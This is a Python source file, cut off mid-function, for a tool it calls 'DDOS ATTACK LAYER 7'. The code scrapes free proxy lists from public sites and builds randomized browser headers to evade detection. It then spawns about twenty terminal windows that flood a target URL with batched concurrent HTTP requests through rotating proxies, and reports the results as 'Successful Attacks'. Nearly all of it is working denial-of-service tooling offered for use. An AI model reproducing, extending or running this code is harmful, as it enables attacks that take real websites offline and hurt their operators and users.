import sys
import requests
import asyncio
import aiohttp
import random
import math  # Add math import for particle calculations
from bs4 import BeautifulSoup
from datetime import datetime
import time
import os
import subprocess
import atexit
import signal
import json
import psutil  # Add this import for better process management
from colorama import init, Fore, Back, Style
import tkinter as tk
from tkinter import ttk, messagebox
import customtkinter as ctk
from PIL import Image, ImageTk
import threading
import webbrowser

# Initialize colorama for Windows compatibility
init()

class Particle:
    def __init__(self, canvas, width, height):
        self.canvas = canvas
        self.width = width
        self.height = height
        self.size = random.randint(1, 3)  # Smaller particles for better effect
        self.x = random.randint(0, width)
        self.y = random.randint(0, height)
        self.speed = random.uniform(0.2, 1.0)  # Slower movement
        self.angle = random.uniform(0, 2 * math.pi)
        self.color = random.choice([
            "#1E90FF", "#00BFFF", "#87CEEB", "#4169E1",  # Blues
            "#00FF00", "#32CD32", "#98FB98",  # Matrix-like greens
            "#FF4444", "#FF6B6B"  # Accent reds
        ])
        self.alpha = random.uniform(0.1, 0.4)
        self.pulse_direction = 1
        self.pulse_speed = random.uniform(0.02, 0.05)
        self.min_size = 1
        self.max_size = 3
        self.current_size = self.size
        
        # Create particle with glow effect
        self.id = self.canvas.create_oval(
            self.x, self.y,
            self.x + self.size,
            self.y + self.size,
            fill=self.color,
            stipple="gray50",
            outline=self.color,  # Add outline for glow effect
            width=1
        )
        
        # Create glow effect
        self.glow = self.canvas.create_oval(
            self.x - 1, self.y - 1,
            self.x + self.size + 2,
            self.y + self.size + 2,
            fill="",
            outline=self.color,
            width=1,
            stipple="gray25"
        )

    def move(self):
        # Update position
        self.x += math.cos(self.angle) * self.speed
        self.y += math.sin(self.angle) * self.speed
        
        # Randomly change direction slightly
        self.angle += random.uniform(-0.1, 0.1)
        
        # Pulse size
        self.current_size += self.pulse_direction * self.pulse_speed
        if self.current_size > self.max_size:
            self.pulse_direction = -1
        elif self.current_size < self.min_size:
            self.pulse_direction = 1

        # Wrap around screen with smooth transition
        if self.x < -self.size:
            self.x = self.width + self.size
        elif self.x > self.width + self.size:
            self.x = -self.size
        if self.y < -self.size:
            self.y = self.height + self.size
        elif self.y > self.height + self.size:
            self.y = -self.size

        # Update particle position with current size
        self.canvas.coords(
            self.id,
            self.x, self.y,
            self.x + self.current_size,
            self.y + self.current_size
        )
        
        # Update glow position
        self.canvas.coords(
            self.glow,
            self.x - 1, self.y - 1,
            self.x + self.current_size + 2,
            self.y + self.current_size + 2
        )

# ASCII Art
ASCII_ART = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣦⣤⣴⣤⣤⣄⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⣻⣿⣦⣀⠀⢀⣀⣀⣏⣹⠀
⢠⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠭⠭⠽⠽⠿⠿⠭⠭⠭⠽⠿⠿⠛
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣿⣿⡟⠏⠉⠉⣿⢿⣿⣿⣿⣇⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⢠⣿⣿⣿⠋⠑⠒⠒⠚⠙⠸⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                   
           DDOS ATTACK LAYER 7 | V 9.9.9
        
       DEVELOPER : FRMDAO | CYTZERO TEAM                                                  
                                                                                                       
                                                                              
                                                                                                                                                                          
"""

# Basic Configuration
DEFAULT_REQUESTS = 1000
BATCH_SIZE_NO_PROXY = 250
BATCH_SIZE_WITH_PROXY = 1000
TOTAL_TERMINALS = 21
PROCESS_FILE = "attack_processes.json"
USER_AGENTS = [
    # Windows Browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.47",
    
    # macOS Browsers
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    
    # Linux Browsers
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    # Mobile Browsers - iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    
    # Mobile Browsers - Android
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Gaming Consoles
    "Mozilla/5.0 (PlayStation 5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Nintendo Switch; ShareApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
    
    # Smart TVs
    "Mozilla/5.0 (SMART-TV; LINUX; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/7.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5735.0 Safari/537.36",
    
    # Tablets
    "Mozilla/5.0 (Linux; Android 14; Tab S9 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
]

# Enhanced Headers Configuration
ACCEPT_ENCODINGS = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    '*/*',
    'gzip',
    'br'
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'en;q=0.9',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9',
    'zh-CN,zh;q=0.9',
    '*'
]

CONTENT_TYPES = [
    'application/json',
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/html',
    'application/xml',
    '*/*'
]

POPULAR_DOMAINS = [
    'google.com',
    'facebook.com',
    'twitter.com',
    'instagram.com',
    'youtube.com',
    'amazon.com',
    'netflix.com',
    'microsoft.com',
    'apple.com',
    'linkedin.com'
]

# Proxy Sources List
PROXY_SOURCES = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks5.txt"  # Added GitHub source
]

# Add new constant for proxy sharing file
PROXY_SHARE_FILE = "proxy_share.json"

# Add new constant for proxy rotation interval
PROXY_ROTATION_INTERVAL = 50  # Rotate proxies every 50 requests

# Add new constants for monitoring
MONITOR_FILE = "monitor_data.json"
MONITOR_TARGET_FILE = "target_info.txt"  # New file to store target info
MONITOR_UPDATE_INTERVAL = 1  # Update interval in seconds

# Function to fetch proxies from online sources
async def fetch_proxies(source):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as response:
                if response.status == 200:
                    html = await response.text()
                    
                    # Handle GitHub raw proxy list
                    if "githubusercontent.com" in source:
                        proxies = []
                        for line in html.strip().split('\n'):
                            line = line.strip()
                            if line and ':' in line:  # Valid proxy format check
                                proxies.append(f"socks5://{line}")  # Use SOCKS5 protocol
                        return proxies
                        
                    # Handle other sources as before
                    if "us-proxy.org" in source or "socks-proxy.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'proxylisttable'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyscrape.com" in source:
                        proxies = html.strip().split('\r\n')
                        return ["http://" + proxy for proxy in proxies]
                    elif "proxynova.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'tbl_proxy_list'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxybros.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxydb.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-sm'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "spys.one" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'spy1xx'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "freeproxy.world" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped table-bordered'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "hasdata.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'proxies'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyrack.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "api.proxyscrape.com" in source:
                         proxies = html.strip().split('\r\n')
                         return proxies
                    else:
                        print(f"Cannot process proxy source: {source}")
                        return []
                else:
                    print(f"Failed to fetch proxies from {source}. Status code: {response.status}")
                    return []
    except Exception as e:
        print(f"Error fetching proxies from {source}: {e}")
        return []

# Function to collect proxies from all sources
async def get_all_proxies():
    all_proxies = []
    for source in PROXY_SOURCES:
        proxies = await fetch_proxies(source)
        if proxies:
            all_proxies.extend(proxies)
            print(f"Successfully fetched {len(proxies)} proxies from {source}")
        else:
            print(f"Failed to fetch proxies from {source}")
    return all_proxies

# Function to clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to show loading progress (updated for speed)
def show_progress(progress, total=100, length=50):
    percent = (progress / float(total)) * 100
    filled_length = int(length * progress // total)
    bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled_length + f"{Fore.WHITE}░{Style.RESET_ALL}" * (length - filled_length)
    print(f'\r{Fore.YELLOW}Progress:{Style.RESET_ALL} [{bar}] {Fore.CYAN}{percent:.1f}%{Style.RESET_ALL}', end='', flush=True)

# Function to generate random headers
def generate_headers(url):
    # Parse the target URL to get domain
    from urllib.parse import urlparse
    parsed_url = urlparse(url)
    target_domain = parsed_url.netloc
    
    # Generate random referrer
    referer = f"https://{random.choice(POPULAR_DOMAINS)}"
    if random.random() < 0.3:  # 30% chance to use same-site referrer
        referer = f"https://{target_domain}/{hex(random.randint(0, 1000000))[2:]}"
    
    # Generate random origin
    origin = f"https://{random.choice(POPULAR_DOMAINS)}"
    if random.random() < 0.4:  # 40% chance to use target as origin
        origin = f"https://{target_domain}"
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(CONTENT_TYPES),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': random.choice(ACCEPT_ENCODINGS),
        'Referer': referer,
        'Origin': origin,
        'DNT': '1' if random.random() < 0.5 else '0',
        'Connection': 'keep-alive' if random.random() < 0.7 else 'close',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', '']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'same-site', 'cross-site']),
        'Cache-Control': 'no-cache' if random.random() < 0.3 else 'max-age=0',
        'X-Requested-With': 'XMLHttpRequest' if random.random() < 0.3 else '',
    }
    
    # Randomly add extra headers
    if random.random() < 0.3:
        headers['Upgrade-Insecure-Requests'] = '1'
    if random.random() < 0.2:
        headers['Pragma'] = 'no-cache'
    if random.random() < 0.2:
        headers['If-None-Match'] = f'W/"{hex(random.randint(0, 1000000))[2:]}"'
    
    # Clean up empty headers
    return {k: v for k, v in headers.items() if v}

# Function to perform DDoS attack (optimized)
async def attack(url, session, stealth_mode, proxy=None):
    headers = generate_headers(url)
    try:
        if proxy:
            # Reduced timeout and optimized connection settings for proxies
            timeout = aiohttp.ClientTimeout(total=3, connect=1)
            connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as proxy_session:
                async with proxy_session.get(url, headers=headers, proxy=proxy) as response:
                    return "Success"
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                return "Success"
    except:
        return "Failed"

def save_process_info(pid, child_pids):
    try:
        data = {
            "parent_pid": pid,
            "child_pids": child_pids,
            "timestamp": time.time()
        }
        with open(PROCESS_FILE, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        print(f"{Fore.RED}Failed to save process info: {str(e)}{Style.RESET_ALL}")

def kill_process_tree(pid):
    try:
        if os.name == 'nt':  # Windows
            # Kill process tree using taskkill
            subprocess.run(['taskkill', '/F', '/T', '/PID', str(pid)], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
            
            # Additional cleanup using psutil
            try:
                parent = psutil.Process(pid)
                children = parent.children(recursive=True)
                for child in children:
                    child.kill()
                parent.kill()
            except:
                pass
        else:  # Linux/Unix
            parent = psutil.Process(pid)
            children = parent.children(recursive=True)
            for child in children:
                child.kill()
            parent.kill()
    except:
        pass  # Process might already be dead

def cleanup_processes():
    try:
        if os.path.exists(PROCESS_FILE):
            with open(PROCESS_FILE, 'r') as f:
                data = json.load(f)
            
            # Kill all child processes
            for pid in data.get("child_pids", []):
                kill_process_tree(pid)
            
            # Kill any python processes that might be related to our script
            if os.name == 'nt':  # Windows
                script_name = os.path.basename(__file__)
                subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/FI', f'WINDOWTITLE eq *DDOS*'],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            
            # Remove all temporary files
            os.remove(PROCESS_FILE)
            if os.path.exists(PROXY_SHARE_FILE):
                os.remove(PROXY_SHARE_FILE)
            if os.path.exists(MONITOR_FILE):
                os.remove(MONITOR_FILE)
            if os.path.exists(MONITOR_TARGET_FILE):
                os.remove(MONITOR_TARGET_FILE)
    except Exception as e:
        print(f"{Fore.RED}Failed to cleanup processes: {str(e)}{Style.RESET_ALL}")

def spawn_attack_terminals(url, num_requests, stealth_mode, use_proxy):
    script_path = os.path.abspath(__file__)
    child_pids = []
    
    # Save target info for monitor
    try:
        with open(MONITOR_TARGET_FILE, 'w') as f:
            f.write(url)
    except Exception as e:
        pass
    
    # If using proxies, save them to a temporary file for spawned terminals
    if use_proxy and proxies:
        try:
            with open(PROXY_SHARE_FILE, 'w') as f:
                json.dump(proxies, f)
        except Exception as e:
            print(f"{Fore.RED}Failed to save proxy list: {str(e)}{Style.RESET_ALL}")
    
    # Create command with exact same settings including proxy settings
    base_cmd = f'python "{script_path}" --spawn-instance "{url}" {num_requests} {1 if stealth_mode else 0} {1 if use_proxy else 0}'
    
    print(f"{Fore.CYAN}Launching attack terminals...{Style.RESET_ALL}")
    
    # Spawn all attack terminals first
    for i in range(TOTAL_TERMINALS - 1):  # -1 because current terminal counts as one
        try:
            if os.name == 'nt':  # Windows
                # Create visible window with specific title
                cmd = f'start cmd /k "title DDOS Terminal {i+1}/{TOTAL_TERMINALS-1} && {base_cmd}"'
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                )
                child_pids.append(process.pid)
                
                # Get the actual CMD window process
                time.sleep(0.2)  # Wait for the window to be created
                for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                    try:
                        if proc.info['window_title'] and f"DDOS Terminal {i+1}" in proc.info['window_title']:
                            if proc.pid not in child_pids:
                                child_pids.append(proc.pid)
                    except:
                        continue
            else:  # Linux/Unix
                process = subprocess.Popen(
                    ['gnome-terminal', '--', 'python', script_path, '--spawn-instance', url, 
                     str(num_requests), str(1 if stealth_mode else 0), str(1 if use_proxy else 0)],
                    preexec_fn=os.setsid
                )
                child_pids.append(process.pid)
        except Exception as e:
            print(f"{Fore.RED}Failed to spawn terminal {i+1}: {str(e)}{Style.RESET_ALL}")
        time.sleep(0.1)  # Small delay between spawns
    
    # Save process information
    save_process_info(os.getpid(), child_pids)
    
    print(f"{Fore.GREEN}Spawned {TOTAL_TERMINALS-1} attack terminals{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Waiting 5 seconds before launching monitor...{Style.RESET_ALL}")
    
    # Wait 5 seconds before launching monitor
    time.sleep(5)
    
    return child_pids

# Function to split proxies for each terminal
def get_terminal_proxies(all_proxies, terminal_number, total_terminals):
    if not all_proxies or not isinstance(all_proxies, list):
        return []
    
    try:
        # Ensure terminal_number is valid
        terminal_number = max(0, min(terminal_number, total_terminals - 1))
        
        # Calculate slice size for each terminal (minimum 1)
        slice_size = max(1, len(all_proxies) // total_terminals)
        
        # Get start and end index for this terminal's proxy slice
        start_idx = terminal_number * slice_size
        end_idx = start_idx + slice_size if terminal_number < total_terminals - 1 else len(all_proxies)
        
        # Ensure indices are within bounds
        start_idx = min(start_idx, len(all_proxies))
        end_idx = min(end_idx, len(all_proxies))
        
        # Return this terminal's proxy slice
        return all_proxies[start_idx:end_idx] if start_idx < end_idx else []
    except Exception as e:
        print(f"{Fore.RED}Error distributing proxies: {str(e)}{Style.RESET_ALL}")
        return []  # Return empty list on error

# Main function to run concurrent attacks (optimized)
async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
    clear_screen()
    print(ASCII_ART)

    print(f"{Fore.RED}Launching attack on {Fore.YELLOW}{url}{Style.RESET_ALL}")
    print(f"{Fore.RED}Requests: {Fore.YELLOW}{num_requests}{Style.RESET_ALL}\n")
    print(f"{Fore.RED}Press Ctrl+C to stop attack{Style.RESET_ALL}\n")

    success_count = 0
    failure_count = 0
    start_time = time.time()
    
    # Determine if this is a spawned terminal
    is_spawned = '--spawn-instance' in sys.argv
    
    # Get terminal number if this is a spawned instance
    terminal_number = 0
    if is_spawned:
        try:
            # Extract terminal number from window title (format: "DDOS Terminal X/Y")
            if os.name == 'nt':
                for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                    if proc.info['window_title'] and "DDOS Terminal" in proc.info['window_title']:
                        terminal_number = int(proc.info['window_title'].split()[2].split('/')[0])
                        break
        except:
            pass
    
    # Initialize terminal_proxies
    terminal_proxies = []
    
    # Load proxies based on whether this is a spawned instance or main process
    if use_proxy:
        try:
            if is_spawned:
                # Load proxies from shared file for spawned instances
                if os.path.exists(PROXY_SHARE_FILE):
                    try:
                        with open(PROXY_SHARE_FILE, 'r') as f:
                            all_proxies = json.load(f)
                            if isinstance(all_proxies, list) and all_proxies:  # Verify we have a valid list
                                terminal_proxies = get_terminal_proxies(all_proxies, terminal_number, TOTAL_TERMINALS)
                                if terminal_proxies:
                                    print(f"{Fore.GREEN}Successfully loaded {len(terminal_proxies)} proxies for terminal {terminal_number}{Style.RESET_ALL}")
                                else:
                                    print(f"{Fore.YELLOW}No proxies assigned to terminal {terminal_number}{Style.RESET_ALL}")
                            else:
                                print(f"{Fore.YELLOW}No valid proxies found in shared file{Style.RESET_ALL}")
                    except json.JSONDecodeError:
                        print(f"{Fore.RED}Error decoding proxy file{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}Error loading proxies: {str(e)}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}No proxy share file found{Style.RESET_ALL}")
            else:
                # Use provided proxies for main process
                if isinstance(proxies, list) and proxies:  # Verify we have a valid list
                    terminal_proxies = get_terminal_proxies(proxies, terminal_number, TOTAL_TERMINALS)
                    if terminal_proxies:
                        print(f"{Fore.GREEN}Successfully loaded {len(terminal_proxies)} proxies for main process{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}No proxies assigned to main process{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}No valid proxies provided{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Failed to load proxies: {str(e)}{Style.RESET_ALL}")
            terminal_proxies = []  # Reset to empty list on error

    # Setup client session based on proxy availability
    if terminal_proxies:
        print(f"{Fore.CYAN}Using {len(terminal_proxies)} unique proxies for this terminal{Style.RESET_ALL}")
        connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=3, connect=1)
        client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    else:
        print(f"{Fore.YELLOW}No proxies assigned to this terminal{Style.RESET_ALL}")
        client_session = aiohttp.ClientSession()
    
    # Set batch size based on proxy usage
    current_batch_size = BATCH_SIZE_WITH_PROXY if terminal_proxies else BATCH_SIZE_NO_PROXY
    print(f"{Fore.CYAN}Using batch size: {current_batch_size} {'(with proxies)' if terminal_proxies else '(without proxies)'}{Style.RESET_ALL}\n")

    # Only spawn additional processes if this is the main instance and we're not in GUI mode
    if not is_spawned and not any('--gui-mode' in arg for arg in sys.argv):
        spawn_attack_terminals(url, num_requests, stealth_mode, use_proxy)

    try:
        async with client_session as session:
            tasks = []
            for i in range(num_requests):
                # Only use proxy if we have proxies available
                proxy = random.choice(terminal_proxies) if terminal_proxies else None
                task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
                tasks.append(task)

                if len(tasks) >= current_batch_size:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    success_count += sum(1 for r in results if r == "Success")
                    failure_count += sum(1 for r in results if r != "Success")
                    tasks = []
                    show_progress((i + 1) / num_requests * 100)
                    
                    # Update monitor data
                    stats = {
                        "success": success_count,
                        "failure": failure_count,
                        "progress": (i + 1) / num_requests * 100,
                        "proxy_count": len(terminal_proxies) if terminal_proxies else 0
                    }
                    update_monitor_data(terminal_number, stats)

            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count += sum(1 for r in results if r == "Success")
                failure_count += sum(1 for r in results if r != "Success")
                show_progress(100)
                
                # Final monitor data update
                stats = {
                    "success": success_count,
                    "failure": failure_count,
                    "progress": 100,
                    "proxy_count": len(terminal_proxies) if terminal_proxies else 0
                }
                update_monitor_data(terminal_number, stats)

    except KeyboardInterrupt:
        if not is_spawned:  # Only parent process should cleanup
            kill_all_terminals()  # Silent kill
            print(f"\n\n{Fore.RED}Attack stopped.{Style.RESET_ALL}")
        return

    except Exception as e:
        if not is_spawned:
            kill_all_terminals()  # Silent kill
        raise

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"\n\n{Fore.RED}═══════ 💣 Attack Report 💣 ═══════{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Target URL:{Style.RESET_ALL} {url}")
    print(f"{Fore.YELLOW}Total Requests:{Style.RESET_ALL} {num_requests}")
    print(f"{Fore.GREEN}Successful Attacks:{Style.RESET_ALL} {success_count}")
    print(f"{Fore.RED}Failed Attacks:{Style.RESET_ALL} {failure_count}")
    print(f"{Fore.BLUE}Time Elapsed:{Style.RESET_ALL} {elapsed_time:.2f} seconds")
    if terminal_proxies:
        print(f"{Fore.CYAN}Proxies Used:{Style.RESET_ALL} {len(terminal_proxies)}")
    print(f"{Fore.RED}═══════════════════════════════════{Style.RESET_ALL}")

def load_proxies_from_file():
    try:
        # Get the current working directory and full path
        current_dir = os.getcwd()
        file_path = os.path.join(current_dir, 'sock5.txt')
        
        print(f"{Fore.YELLOW}Current directory: {current_dir}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Looking for file at: {file_path}{Style.RESET_ALL}")
        
        if not os.path.exists(file_path):
            print(f"{Fore.RED}File not found at expected location{Style.RESET_ALL}")
            # Try looking in the script's directory
            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, 'sock5.txt')
            print(f"{Fore.YELLOW}Trying script directory: {file_path}{Style.RESET_ALL}")
            
            if not os.path.exists(file_path):
